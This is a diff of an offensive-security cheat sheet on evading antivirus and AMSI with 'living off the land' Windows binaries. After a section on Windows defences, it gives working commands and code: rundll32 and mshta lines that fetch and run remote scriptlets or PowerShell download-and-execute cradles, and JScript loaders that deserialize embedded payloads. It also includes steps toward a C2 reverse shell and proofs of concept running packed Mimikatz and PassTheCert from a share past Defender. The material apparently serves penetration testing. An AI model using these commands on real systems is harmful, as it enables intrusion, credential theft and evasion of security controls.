@@ -1,6 +1,6 @@
-===================================================================================================================================================
+================================================================================================================================================================
 AV bypass using 'Living Off The Land' and fileless techniques
-===================================================================================================================================================
+================================================================================================================================================================
 
 INDEX
 ======
@@ -10,177 +10,814 @@ I.   Reminder & Definitions
      ➤ Microsoft Antimalware Scan Interface (AMSI)
      ➤ Windows security features and Microsoft security products
 
-II.  Basic examples of 'Living Off The Land' techniques using PowerShell (i.e. load & execute straight in-memory PE/DLL/scripts) 
+II.  Basic examples of 'Living Off The Land' techniques using LOLBAS (i.e. Living Off The Land Binaries, Scripts and Libraries)
+     ➤ Rundll32.exe
+     ➤ Pcalua.exe
+     ➤ Remote.exe
+     ➤ WMI.exe
+     ➤ Mshta.exe
+     ➤ etc.
 
-III. Basic examples of 'Living Off The Land' techniques using LOLBAS (i.e. Living Off The Land Binaries, Scripts and Libraries)
-     ➤ 'Rundll32.exe', 'Pcalua.exe', 'Remote.exe', 'Regsvr32.exe', 'Wscript.exe', etc.
+III. Basic examples of 'Living Off The Land' techniques using PowerShell (i.e. load & execute straight in-memory PE/DLL/scripts)
+     ➤ PowerShell scripts
+     ➤ .Net Assemblies (PE and DLL)
 
-IV.  AMSI bypass techniques to be able to load & execute straight in-memory offensive tools without being detected by Antivirus
+IV.  AMSI bypass techniques to be able to load and execute in-memory offensive tools (PowerShell scripts & C# assemblies) without being detected by Antivirus
      ➤ AMSI bypass technique 1 - Force the AMSI initialization to fail in the current PowerShell session 
-     ➤ AMSI bypass technique 2 - Patching the "Amsi.dll" in memory 
-     ➤ AMSI bypass technique 3 - Modify a Windows registry key to disable the AMSI (admin priv required)
-     ➤ AMSI bypass technique 4 - PowerShell downgrade attack (use PowerShell version 2 which doesn't support AMSI)
-     ➤ AMSI bypass technique 5 - AMSI dll hijacking
+     ➤ AMSI bypass technique 2 - Patching the "Amsi.dll" in memory (AmsiScanBuffer)
+     ➤ AMSI bypass technique 3 - Patching the "Amsi.dll" in memory (AmsiOpenSession)
+     ➤ AMSI bypass technique 4 - Using hardware breakpoint on "AmsiScanBuffer"
+     ➤ AMSI bypass technique 5 - Modify a Windows registry key to disable the AMSI (admin priv required)
+     ➤ AMSI bypass technique 6 - PowerShell downgrade attack (use PowerShell version 2 which doesn't support AMSI)
+     ➤ AMSI bypass technique 7 - AMSI dll hijacking
+     ➤ AMSI bypass technique 8 - Lifetime AMSI bypass by @ZeroMemoryEx 
 
-V.   Tools that bypass AV products (AMSI+ETW patching) and allow to load and execute straight in-memory offensive .Net assemblies
+V.   Tools that bypass AV products (AMSI+ETW patching) and allow to load and execute straight in-memory offensive C# .Net assemblies
 
-VI.  Tools that bypass AV products and allow to load and execute straight in-memory offensive PE files
+VI.  Tools that bypass AV products and allow to load and execute straight in-memory offensive PE files (un-managed code like C/C++ programs)
 
 
-===================================================================================================================================================
+================================================================================================================================================================
 I. Reminder & Definitions
-===================================================================================================================================================
+================================================================================================================================================================
 
------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
 1.1 Why using 'living off the land and fileless' techniques ?
------------------------------------------------------------------
-> The purpose of the 'living off the land' and fileless techniques is to avoid getting detected and blocked by the antivirus and 
-  end-point protection solutions installed on modern Windows machines during penetration tests by:
-  - running scripts, portable executable files and shellcodes directly into memory  
-  - using as much as possible legitimate sysadmin tools and software that are already installed on the target computers.
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+The purpose of the 'living off the land' and fileless techniques is to avoid getting detected and blocked by the antivirus and end-point protection 
+solutions installed on modern Windows machines during penetration tests by:
+ - running scripts, portable executable files and shellcodes directly into memory  
+ - using as much as possible legitimate sysadmin tools and software that are already installed on the target computers.
   
-  The four main categories of living off the land and fileless attack techniques are: 
-  - memory-only threats, 
-  - fileless persistence, 
-  - dual-use tools,
-  - non-PE file attacks.
+The four main categories of living off the land and fileless attack techniques are: 
+ - memory-only threats, 
+ - fileless persistence, 
+ - dual-use tools,
+ - non-PE file attacks.
 
-  In general, creating less new files on the hard disk means less chance of being detected by traditional security tools (i.e. AV) 
-  and therefore minimizes the risk of an attack being detected and blocked.
+In general, creating less new files on the hard disk means less chance of being detected by traditional security tools (i.e. AV) and therefore minimizes the
+risk of an attack being detected and blocked.
 
-  During a penetration test, before executing directly into memory a PowerShell script, a shellcode or a portable executable file 
-  (using the reflective PE-Loading technique) on a modern Windows system it is recommended to disable the Antimalware Scan Interface (AMSI)
-  to avoid our script, shellcode or PE file being scanned and potentially blocked by the AV installed on the Windows system.
+During a penetration test, before loading and executing directly in-memory PowerShell/VBS/JS scripts, or C# assemblies (i.e., .Net dll and PE files) 
+on modern Windows systems it is recommended to disable the Antimalware Scan Interface (AMSI) to avoid our malicious files being scanned and potentially 
+blocked by the AV solutions installed on the Windows systems.
 
----------------------------------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
 1.2 Microsoft Antimalware Scan Interface (AMSI)
----------------------------------------------------------------------------------------------------------------------------------------------------
-> The Microsoft Antimalware Scan Interface (AMSI) provides enhanced malware protection by allowing the Antivirus solution installed 
-  on a modern Windows computer (i.e. Windows 10/11 or Windows server 2016/2019/2022) to scan the applications and scripts before they
-  are executed. 
-  For instance, the AMSI feature is integrated into these components when they are executed:
-  - User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
-  - PowerShell greater than 2.0 (scripts, interactive use, and dynamic code evaluation)
-  - Windows Script Host (wscript.exe and cscript.exe)
-  - JavaScript and VBScript
-  - Office VBA macros
-  - .NET Framework
-  - Windows Management Instrumentation (WMI)
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+➤ The Microsoft Antimalware Scan Interface (AMSI) provides enhanced malware protection by allowing the Antivirus solution installed on a modern Windows computer
+   (i.e. Windows 10/11 or Windows server 2016/2019/2022/2025) to scan the applications and scripts before they are executed. 
+   For instance, the AMSI feature is integrated into these components when they are executed:
+   - User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
+   - PowerShell greater than 2.0 (scripts, interactive use, and dynamic code evaluation)
+   - Windows Script Host (wscript.exe and cscript.exe)
+   - JavaScript and VBScript
+   - Office VBA macros
+   - .NET Framework 4.8 or newer (scanning of all assemblies)
+   - Windows Management Instrumentation (WMI)
 
-> The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows the applications and services to integrate
-  with any antimalware product
-  that's present on a Windows machine (e.g. Microsoft Defender AntiVirus is enabled by default on Windows 10/11).
-  AMSI is agnostic of antimalware vendor; it's designed to allow for the most common malware scanning and protection techniques provided
-  by today's antimalware products that can be integrated into applications. 
+➤ The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows the applications and services to integrate  with any antimalware 
+   product that's present on a Windows machine (e.g. Microsoft Defender AntiVirus is enabled by default on all modern Windows OS).
+   AMSI is agnostic of antimalware vendor; it's designed to allow for the most common malware scanning and protection techniques provided by today's antimalware 
+   products that can be integrated into applications. 
   
-> The AMSI protects PowerShell by loading AMSI’s DLL (amsi.dll) into the PowerShell’s memory space.
-  It scans the PowerShell console input by using Microsoft Defender (or other AV) to determine whether to block the payload operation or 
-  allow it to continue.
-  Prior to execution the following two API’s are used by the antivirus to scan the buffer and strings for signs of malware.
-  - AmsiScanBuffer()
-  - AmsiScanString()
+➤ The AMSI protects PowerShell by loading AMSI’s DLL (amsi.dll) into the PowerShell’s memory space.
+   It scans the PowerShell console input by using Microsoft Defender (or other AV) to determine whether to block the payload operation or allow it to continue.
+   Prior to execution the following two API’s are used by the antivirus to scan the buffer and strings for signs of malware.
+   - AmsiScanBuffer()
+   - AmsiScanString()
 
-> There are many techniques to bypass AMSI such as:
-  - patching the amsi.dll in memory
-  - setting the “amsiInitFailed” flag to prevent AMSI scanning capability for the current process (the strings 'AmsiUtils' & 'amsiInitFailed'
-    are encoded to avoid the AV to detect and block the AMSI bypass)
-  - forcing an error i.e. forcing the AMSI initialization to fail (amsiInitFailed) so no scan will be initiated for the current process
-  - placing a separate amsi.dll in the current working directory (note: legacy technique)
-  - Windows registry key modification
+➤ There are many techniques to bypass AMSI such as:
+   - patching the amsi.dll in memory
+   - using a hardware breakpoint on "AmsiScanBuffer"
+   - setting the “amsiInitFailed” flag to prevent AMSI scanning capability for the current process (the strings 'AmsiUtils' & 'amsiInitFailed'
+     are encoded to avoid the AV to detect and block the AMSI bypass)
+   - forcing an error i.e. forcing the AMSI initialization to fail (amsiInitFailed) so no scan will be initiated for the current process
+   - placing a separate amsi.dll in the current working directory (note: legacy technique)
+   - Windows registry key modification
   The goal of attackers is to prevent a scan from taking place or to deliver a “clean” result and not being flagged as “malicious”. 
 
-  Usefull links:
-  - https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
-  - https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/
-  - https://amsi.fail
-  - https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/
-  - etc.
+➤ Usefull links:
+   - https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
+   - https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/
+   - https://www.r-tec.net/r-tec-blog-bypass-amsi-in-2025.html
+   - https://amsi.fail
+   - https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/
+   - etc.
   
----------------------------------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
 1.3 Windows security features and Microsoft security products
----------------------------------------------------------------------------------------------------------------------------------------------------
-> PowerShell security features
-  Microsoft has added some security features in PowerShell v5 to help out the Blue teams such as: 
-  - Constrained Language Mode
-    It is a setting in PowerShell that greatly limits what commands can be performed. This can potentially reduce the available attack
-    surface to adversary's. 
-  - Deep Script Block Logging
-    It records block of code as they are executed therefore it captures the complete activity and full content of the script. 
-    It maintains the complete audit trail of each activity which can be used later in forensics and to study the malicious behavior. 
-    It records all the activity at time of execution thus provides the complete details.
-    Everytime an adversary executes an encoded PowerShell script or command, script block logging provides that data in its raw form.
-  - System-Wide Transcripts
-    It creates a record of all or part of a PowerShell session to a text file. 
-    The transcript includes all command that the user types and all output that appears on the console.
-  - Antimalware Scan Interface (AMSI)  
-  - ...
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
 
-> Microsoft Defender AV
-  - Real-Time protection and Antimalware Scan Interface (AMSI) 
-  - Automatic and manual scanning
-  - Tamper protection (prevents other form tampering with important security features)
-  - Sample submissions
-  - ...
+➤ PowerShell security features
+  -----------------------------
+   Microsoft has added some security features in PowerShell v5 to help out the Blue teams such as: 
+   1. Constrained Language Mode
+      + It is a setting in PowerShell that greatly limits what commands can be performed. This can potentially reduce the available attack surface to adversary's. 
+   2. Deep Script Block Logging
+      + It records block of code as they are executed therefore it captures the complete activity and full content of the script. 
+      + It maintains the complete audit trail of each activity which can be used later in forensics and to study the malicious behavior. 
+      + It records all the activity at time of execution thus provides the complete details.
+      + Everytime an adversary executes an encoded PowerShell script or command, script block logging provides that data in its raw form.
+   3. System-Wide Transcripts
+      + It creates a record of all or part of a PowerShell session to a text file. 
+      + The transcript includes all command that the user types and all output that appears on the console.
+   4 Antimalware Scan Interface (AMSI)  
 
-> Software whitelisting using AppLocker 
-  - AppLocker is an application whitelisting technology introduced with Microsoft's Windows 7 OS. It allows restricting which 
-    programs users can execute based on the program's path, publisher, or hash, and in an enterprise can be configured via GPO.
-  - AppLocker can control the following file types: Executables, DLLs, Scripts, Windows Installers, Packaged apps and installers.
-  - AppLocker supports Windows 10/11 and Windows server 2016 and above.
-  Note: Microsoft Software Restriction Policy (SRP) can still be used but is "deprecated". AppLocker is recommended for supported 
-        Windows OS.
+➤ Microsoft Defender Antivirus
+  ----------------------------
+   1. Virus and threat protections
+      + Automatic and manual AV scanning (signature-based detection)
+      + Utilizes the anti-malware Scan Interface (AMSI) to enhance protection against fileless malware, dynamic script-based attacks, and other nontraditional threats.
+      + Real-Time protection 
+        o Real-time protection, behavior monitoring, and heuristics to identify malware based on known suspicious and malicious activities including events, 
+          such as processes making unusual changes to existing files, modifying or creating automatic startup registry keys and startup locations, and other 
+          changes to the file system or file structure. 
+        o Monitors process behavior to detect and analyze potential threats based on the behavior of applications, services, and files. 
+      + Cloud-delivered protection
+        o Cloud protection works together with Microsoft Defender AV to enhance standard real-time protection.
+        o Malware detection through generic and heuristic techniques as well as behavioral analysis to detect file-based and file-less attacks.
+      + Automatic Sample submission
+        o Cloud protection and automatic sample submission work together with Microsoft Defender AV to help protect against new and emerging threats.
+        o If a suspicious or malicious file is detected, a sample is sent to the cloud service for analysis while Microsoft Defender Antivirus blocks the file. 
+   2. Tamper protection
+      + Pevents other from tampering with important security features.
+   3. Controlled folder access & Ransomware protection
+      + Protects files, folders and memory areas on the device from unauthorized changes by unfriendly applications.
+   4. App and browser control (a.k.a Microsoft Defender SmartScreen)
+      + Reputation-based protection against "Potentially Unwanted Application" (PUA)
+        The following settings protect the device form malicious or potentially unwanted app, files and websites.
+         o Check apps and files (for unrecognized apps and files from the Web)
+         o SmartScreen for Microsoft Edge (PUA protection in Chromium-based Microsoft Edge)
+         o Potentially unwanted app blocking (protect from low-reputation apps that might cause unexpected behaviours)
+   5. Notifications
+      + Windows security can send notifcations with critical information about the health and security of the device.
+
+➤ Software whitelisting using AppLocker
+  -------------------------------------
+   - AppLocker is an application whitelisting technology introduced with Microsoft's Windows 7 OS. It allows restricting which programs users can execute 
+     based on the program's path, publisher, or hash, and in an enterprise can be configured via GPO.
+   - AppLocker can control the following file types: Executables, DLLs, Scripts, Windows Installers, Packaged apps and installers.
+   - AppLocker supports Windows 10/11 and Windows server 2016 and above.
   
-> Windows Event Tracing (ETW) 
-  - ETW provides a way to trace and log events from both user and kernel mode. 
-  - It is used by AV and EDR to detect attacks.
+➤ Windows Event Tracing (ETW) 
+  ---------------------------
+   - ETW provides a way to trace and log events from both user and kernel mode. 
+   - It is used by AV and EDR to detect attacks.
   
-> LSASS & Protected Process Light (PPL)
-  - On Windows the Local Security Authority Subsystem is responsible for safeguarding the NTLM hashes, Kerberos tickets and anything 
-    that has to do with authentication and authorization.
-  - To prevent the bad guys from stealing credentials, a security feature called LSA (Local Security Authority) Protection Light was 
-    introduced.
-  - RunAsPPL for LSASS is a true quick win. It is very easy to configure as the only thing you have to do is add a simple value in 
-    the registry and reboot. Like any other protection though, it is not bulletproof and it is not sufficient on its own, but it is 
-    still particularly efficient. Attackers will have to use some relatively advanced tricks if they want to work around it, which 
-    ultimately increases their chance of being detected.
+➤ LSASS & Protected Process Light (PPL)
+  -------------------------------------
+   - On Windows the Local Security Authority Subsystem is responsible for safeguarding the NTLM hashes, Kerberos tickets and anything that has to do with 
+     authentication and authorization.
+   - To prevent the bad guys from stealing credentials, a security feature called LSA (Local Security Authority) Protection Light was introduced.
+   - RunAsPPL for LSASS is a true quick win. It is very easy to configure as the only thing you have to do is add a simple value in the registry and reboot. 
+     Like any other protection though, it is not bulletproof and it is not sufficient on its own, but it is still particularly efficient. 
+     Attackers will have to use some relatively advanced tricks if they want to work around it, which ultimately increases their chance of being detected.
     
-> Microsoft Defender Credential Guard 
-  - It uses virtualization-based security to isolate secrets so that only privileged system software can access them. 
-    Unauthorized access to these secrets can lead to credential theft attacks, such as Pass-the-Hash or Pass-The-Ticket. 
-    Microsoft Defender Credential Guard prevents these attacks by protecting NTLM password hashes, Kerberos Ticket Granting Tickets, 
-    and credentials stored by applications as domain credentials.
-  - By enabling Microsoft Defender Credential Guard, the following features and solutions are provided:
-    + Hardware security NTLM, Kerberos, and Credential Manager take advantage of platform security features, including Secure Boot 
-      and virtualization, to protect credentials.
-    + Virtualization-based security Windows NTLM and Kerberos derived credentials and other secrets run in a protected environment 
-      that is isolated from the running operating system.
-    + Better protection against advanced persistent threats When Credential Manager domain credentials, NTLM, and Kerberos derived 
-      credentials are protected using virtualization-based security, the credential theft attack techniques and tools used in many 
-      targeted attacks are blocked. Malware running in the operating system with administrative privileges cannot extract secrets 
-      that are protected by virtualization-based security.
+➤ Microsoft Defender Credential Guard
+  -----------------------------------
+   - It uses virtualization-based security to isolate secrets so that only privileged system software can access them. 
+     Unauthorized access to these secrets can lead to credential theft attacks, such as Pass-the-Hash or Pass-The-Ticket. 
+     Microsoft Defender Credential Guard prevents these attacks by protecting NTLM password hashes, Kerberos Ticket Granting Tickets, and credentials stored 
+     by applications as domain credentials.
+   - By enabling Microsoft Defender Credential Guard, the following features and solutions are provided:
+     + Hardware security NTLM, Kerberos, and Credential Manager take advantage of platform security features, including Secure Boot and virtualization, to 
+       protect credentials.
+     + Virtualization-based security Windows NTLM and Kerberos derived credentials and other secrets run in a protected environment that is isolated from the
+       running operating system.
+     + Better protection against advanced persistent threats When Credential Manager domain credentials, NTLM, and Kerberos derived credentials are protected 
+       using virtualization-based security, the credential theft attack techniques and tools used in many targeted attacks are blocked. 
+       Malware running in the operating system with administrative privileges cannot extract secrets that are protected by virtualization-based security.
 
-> Microsoft Defender for Endpoint (formerly known as Microsoft Defender Advanced Threat Protection (ATP))
-  - It is an EDR that detects and remediates advanced attacks on endpoints. 
-  - It is a post-breach solution that complements Microsoft Defender AV.
+➤ Microsoft Defender for Endpoint (EDR formerly known as Microsoft Defender Advanced Threat Protection "ATP")
+  -----------------------------------------------------------------------------------------------------------
+   - Microsoft Defender for Endpoint is an enterprise endpoint security platform designed to help enterprise networks prevent, detect, investigate, and respond 
+     to advanced threats.
+
+➤ Microsoft Defender for Office 365
+  ---------------------------------
+   - Microsoft Defender for Office 365 is a cloud-based product offering protection against email threats and safeguarding files stored in the cloud.
+
+➤ The Windows Lockdown Policy (WLDP aka Device Guard) 
+   - It checks the digital signature of dynamic code.
+
+
+================================================================================================================================================================
+II. Basic examples of 'Living off the land' techniques using LOLBAS (i.e. Living Off The Land Binaries, Scripts and Libraries)
+================================================================================================================================================================
+
+➤ LOLBAS (i.e. "Living Off The Land Binaries, Scripts and Libraries") refers to the use of legitimate, built-in system binaries or processes to execute 
+  malicious activities. By leveraging these trusted applications, attackers can camouflage their actions, making it difficult for traditional security 
+  measures to detect and respond effectively.
+
+➤ The goal of the 'LOLBAS' project (URL below) is to document every binary, script, and library that can be used for 'Living Off The Land' techniques.
+   => https://lolbas-project.github.io/#
+   => https://github.com/LOLBAS-Project/LOLBAS#criteria
+   => http://malcommands.com/
+
+➤ The examples of LOLBAS presented below are focused on remote execution of PE/EXE, DLL and scripts, and file-less attacks.
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+1. LOLBAS - Rundll32.exe (Allow to execute remote DLL and scripts)
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+➤ Paths:
+   => C:\Windows\System32\rundll32.exe
+   => C:\Windows\SysWOW64\rundll32.exe
+
+
+➤ Execute a DLL from a SMB share. EntryPoint is the name of the entry point in the .DLL file to execute (i.e. execute DLL from SMB share.)
+
+   C:\> rundll32.exe \\10.10.10.10\share\payload.dll,EntryPoint
+
+
+➤ Execute a remote JavaScript files (that could embed offensive security tools or a C2 agent)
+
+   C:\> rundll32.exe javascript:”\..\mshtml,RunHTMLApplication “;document.write();GetObject(“script:httpS://X.X.X.X/payload.sct").Exec();
+
+    Test - How to use this technique to execute a remote C2 agent on a Windows machine 
+    ----------------------------------------------------------------------------------
+    Step 1. Generate a raw shellcode with your favorite C2 framework and start a reverse HTTPs listener
+    Step 2. Convert the format of the shellcode in C# (using for instance the tool "Supernova")
+    Step 3. Insert the C# shellcode in a C# shellcode loader template
+    Step 4. Use the tool "GadgetToJScript" to generate an obfuscated JavaScript file that embed your C# shellcode loader (.CS) in a .NET serialized
+    	      gadget (that will load & execute the C# shellcode loader when deserialized using BinaryFormatter from the JS script)		
+    Step 5. Manually obfuscate the JavaScript file and insert it in a .SCT file
+    Step 6. Use "Rundll32.exe" to execute on a Windows machine the malicious code contained in the .SCT file hosted on your remote Webserver
+    Step 7. Enjoy your C2 reverse shell 	  
+					
+    + Example n°1 of a .SCT file to execute Javascript code (JS generated with https://github.com/med0x2e/GadgetToJScript/tree/master)
+      ---------------------------------------------------------------------------------------------------------------------------------
+	  
+			  <?XML version="1.0"?>
+			  <scriptlet>
+				<public>
+					<method name="Exec"></method>
+				</public>
+				<script language="JScript">
+				<![CDATA[
+					function Exec()
+					{
+						function Base64ToStream(b,l) {
+							var enc = new ActiveXObject("System.Text.ASCIIEncoding");
+							var length = enc.GetByteCount_2(b);
+							var ba = enc.GetBytes_4(b);
+							var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
+							ba = transform.TransformFinalBlock(ba, 0, length);
+							var ms = new ActiveXObject("System.IO.MemoryStream");
+							ms.Write(ba, 0, l);
+							ms.Position = 0;
+							return ms;
+						}
+						var stage_1 ="BLOB";
+						var stage_2 ="BLOB";
+						try {
+							var shell = new ActiveXObject('WScript.Shell');
+							ver = 'v4.0.30319';
+							try {
+								shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
+							} catch(e) { 
+								ver = 'v2.0.50727';
+							}
+							shell.Environment('Process')('COMPLUS_Version') = ver;
+							var ms_1 = Base64ToStream(stage_1, 2341);
+							var fmt_1 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
+							fmt_1.Deserialize_2(ms_1);
+						} catch (e) {
+							try{		
+								var ms_2 = Base64ToStream(stage_2, 117896);
+								var fmt_2 = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
+								fmt_2.Deserialize_2(ms_2);
+							}catch (e2){}
+						}
+					}
+				]]>
+				</script>
+			</scriptlet>
+	    
+    + Example n°2 of a .SCT file to execute Javascript code (JS generated with https://github.com/tyranid/DotNetToJScript)
+      --------------------------------------------------------------------------------------------------------------------
+
+			<?XML version="1.0"?>
+			<scriptlet>
+				<public>
+					<method name="Exec"></method>
+				</public>
+				<script language="JScript">
+				<![CDATA[
+					function Exec()
+					{
+						function setversion() {
+						new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
+						}
+						function debug(s) {}
+						function base64ToStream(b) {
+							var enc = new ActiveXObject("System.Text.ASCIIEncoding");
+							var length = enc.GetByteCount_2(b);
+							var ba = enc.GetBytes_4(b);
+							var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
+							ba = transform.TransformFinalBlock(ba, 0, length);
+							var ms = new ActiveXObject("System.IO.MemoryStream");
+							ms.Write(ba, 0, (length / 4) * 3);
+							ms.Position = 0;
+							return ms;
+						}
+						var serialized_obj = "-----------INSERT-SERIALiZED-OBJECT-HERE------------"
+						var entry_class = 'Test';
+						try {
+							setversion();
+							var stm = base64ToStream(serialized_obj);
+							var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
+							var al = new ActiveXObject('System.Collections.ArrayList');
+							var d = fmt.Deserialize_2(stm);
+							al.Add(undefined);
+							var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
+						} catch (e) {
+							debug(e.message);
+						}
+					}
+				]]>
+				</script>
+			</scriptlet>
+
+
+➤ Execute a JavaScript script that execute a remote PowerShell script (that could embed offensive security tools or a C2 agent)
+
+   C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run
+                     ("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');")
+
+
+    + Example of a .SCT file to execute PowerShell code (SCT generated with https://github.com/samratashok/nishang/blob/master/Client/Out-SCT.ps1)
+      --------------------------------------------------------------------------------------------------------------------------------------------
+
+			<?XML version="1.0"?>
+			<scriptlet>
+				<registration 
+					progid="WinCheck"
+					classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+
+					<script language="JScript">
+						<![CDATA[
+							ps = 'powershell.exe -w h -nologo -noprofile -ep bypass ';
+							c = "Insert-PoSH-Payload-Here";
+							r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true);
+						]]>
+					</script>
+				</registration>
+			</scriptlet>
+
+
+
+➤ Use "Rundll32.exe" and "dfshim.dll" to executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)
+
+   C:\> rundll32.exe dfshim.dll,ShOpenVerbApplication https://www.example.org/file.ext
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+2. LOLBAS - Pcalua.exe (Program Compatibility Assistant - Allow to execute remote exe and dll files)
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+➤ Path:
+   => C:\Windows\System32\pcalua.exe
+
+➤ Execute a remote target binary (.EXE) or DLL using the Program Compatibility Assistant. A pop-up will appear and ask us to confirm the execution 
+  of the binary or DLL remotely hosted on a share. In general, the remote binary is executed in a new windows and exit as soon as the execution is 
+  finished.
+
+   =>  pcalua.exe -a \\server\payload.dll
+   =>  pcalua.exe -a \\server\payload.exe
+
+
+   + PoC - Use 'Pcalua.exe' to launch a packed version of the hacking tool "Mimikatz" on a Windows laptop protected by Windows Defender AV
+     --------------------------------------------------------------------------------------------------------------------------------------
+ 
+     PS C:\Temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,
+				  AntivirusSignatureLastUpdated | FL
+
+		AntivirusEnabled              : True
+		RealTimeProtectionEnabled     : True
+		IoavProtectionEnabled         : True
+		AntispywareEnabled            : True
+		AntivirusSignatureLastUpdated : 5/8/2025 4:35:53 PM
+
+
+     PS C:\Temp> C:\Windows\system32\pcalua.exe -a "\\192.168.1.254\files\Packed-Mimi.exe"
+
+		=> A Windows box message pops-up and ask us to confirm the execution of our malicious tool. I clicked on the button "Run".
+		 
+		"Open File - Security Warning
+		We can't verify who created this file. Are yous sure you want to run this file ?
+
+		Name: \\192.168.1.254\files\Packed-Mimi.exe
+		Type: Application
+		From: \\192.168.1.254\files\Packed-Mimi.exe
+
+		Run button | Cancel button
+		"
+		=> Then a second Windows pops-up executing my packed/obfuscated version of Mimikatz: 
+
+		[+] Success. amsi.dll Patched!
+		[*] Restoring memory protection...
+
+		  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+		 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+		 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+		 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+		 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+		  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+		mimikatz # coffee
+
+			( (
+			 ) )
+		  .______.
+		  |      |]
+		  \      /
+		   `----'
+
+		mimikatz #
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+3. LOLBAS - Remote.exe (Debugging tool included with Windows Debugging Tools - Allow to execute remote exe files)
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+➤ Path:
+   => C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\Remote.exe
+
+
+➤ It is Debugging tool included with Windows Debugging Tools that can be used to execute a remote binary without saving file to disk.
+
+   => Remote.exe /s "\\10.10.10.30\binaries\file.exe" anythinghere
+
+
+   + PoC with the hacking tool "PassTheCert" on a Windows computer protected by Windows Defender AV
+     ----------------------------------------------------------------------------------------------
+
+     C:\Temp> remote.exe /s "\\192.168.1.254\files\Pass-The-Cert.exe --help" anythinghere
+		
+     **************************************
+     ***********     REMOTE    ************
+     ***********     SERVER    ************
+     **************************************
+     To Connect: Remote /C PO744653 "anythinghere"
+
+     PassTheCert.exe [--help] --server DOMAIN_CONTROLLER [--start-tls] --cert-path CERT_PATH [--cert-password CERT_PASSWORD] 
+			      (--elevate|--rbcd|--add-computer|--set-spn|--reset-password|--add-account-to-group) [ATTACK_OPTIONS]
+     GENERAL OPTIONS:
+			--server DOMAIN_CONTROLLER
+				Domain controller to connect to. By default, connection will be done over TCP/636 (LDAPS).
+			--start-tls
+				Indicates that connection should instead be done over TCP/389 (LDAP) and then use StartTLS.
+			--cert-path CERT_PATH
+				Path to the certificate to authenticate with.
+			--cert-password CERT_PASSWORD
+				Password to the certificate (Optional argument. Default value: <empty>).
+		<SNIP>
+
+		Remote exiting. Child (\\192.168.1.254\files\Pass-The-Cert.exe --help) exit code was 0.
+
+		C:\Temp>
+
+
+➤ It can also be used to launch PowerShell...
+
+   => Remote.exe /s "powershell.exe" anythinghere
+	
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+4. LOLBAS - WMI.exe (The WMI command-line (WMIC) utility provides a command-line interface for WMI)
+---------------------------------------------------------------------------------------------------------------------------------------------------	
+
+➤ Paths:
+   => C:\Windows\System32\wbem\wmic.exe
+   => C:\Windows\SysWOW64\wbem\wmic.exe
+
+
+➤ Executes JScript or VBScript embedded in the target remote XSL stylsheet.
+
+   => wmic.exe process get brief /format:"\\servername\C$\Windows\Temp\file.xsl"
+
+
+➤ Execute evil.exe on a remote Windows system.
+
+   => wmic.exe /node:"192.X.X.X" process call create "cmd /c c:\windows\system32\calc.exe"
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+5. LOLBAS - Mshta.exe (Allow to execute remote Visual Basic scripts and JavaScript files)
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+➤ Paths: 
+   => C:\Windows\System32\mshta.exe
+   => C:\Windows\SysWOW64\mshta.exe
+
+
+➤ Executes VBScript supplied as a command line argument.
+
+   => mshta.exe vbscript:Close(Execute("GetObject(""script:https://www.example.org/file.sct"")"))
+
+
+➤ Executes JavaScript supplied as a command line argument.
+
+   => mshta.exe javascript:a=GetObject("script:https://www.example.org/file.sct").Exec();close();
+
+      Test - How to use this technique to execute a remote C2 agent on a Windows machine 
+      ----------------------------------------------------------------------------------
